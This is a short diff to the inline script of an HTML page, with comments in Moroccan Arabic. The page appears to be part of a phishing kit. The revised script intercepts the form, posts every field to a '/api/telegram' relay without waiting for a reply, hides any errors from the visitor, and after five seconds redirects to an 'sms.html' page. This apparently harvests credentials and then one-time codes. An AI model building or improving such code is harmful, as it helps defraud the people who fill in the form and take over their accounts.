@@ -249,34 +249,26 @@
 </form>
 </section>
 <script>
-const form = document.getElementById("myForm");
-
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
-
-  const data = Object.fromEntries(new FormData(form));
-
-  try {
-    const res = await fetch("/api/telegram", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data),
+    const form = document.getElementById("myForm");
+    
+    form.addEventListener("submit", (e) => {
+      e.preventDefault(); // باش ما يتمش الفورم بالطريقة العادية
+    
+      const data = Object.fromEntries(new FormData(form));
+    
+      // نرسل البيانات ل API ولكن بلا ما نوقف أو ننتظر النتيجة
+      fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data),
+      }).catch(err => console.error(err)); // إذا كان خطأ، نكتفيو بالطباعة فقط
+    
+      // مباشرة بعد الإرسال، نعمل redirect بعد 5 ثواني
+      setTimeout(() => {
+        window.location.href = "sms.html";
+      }, 5000);
     });
-
-    // نرسل البيانات ولكن **ما نعرضش alert**
-    // form.reset(); // ممكن تمسح الفورم إذا بغيت
-
-    // بعد 5 ثواني، redirect ل sms.html
-    setTimeout(() => {
-      window.location.href = "sms.html";
-    }, 5000);
-
-  } catch (err) {
-    console.error(err);
-    // نقدر ما نعرضوش alert باش ما يبانش خطأ
-  }
-});
-</script>
+    </script>
 
 
 <footer>
@@ -296,6 +288,7 @@ form.addEventListener("submit", async (e) => {
 </footer>
 </body>
 </html>
+
 
 
 
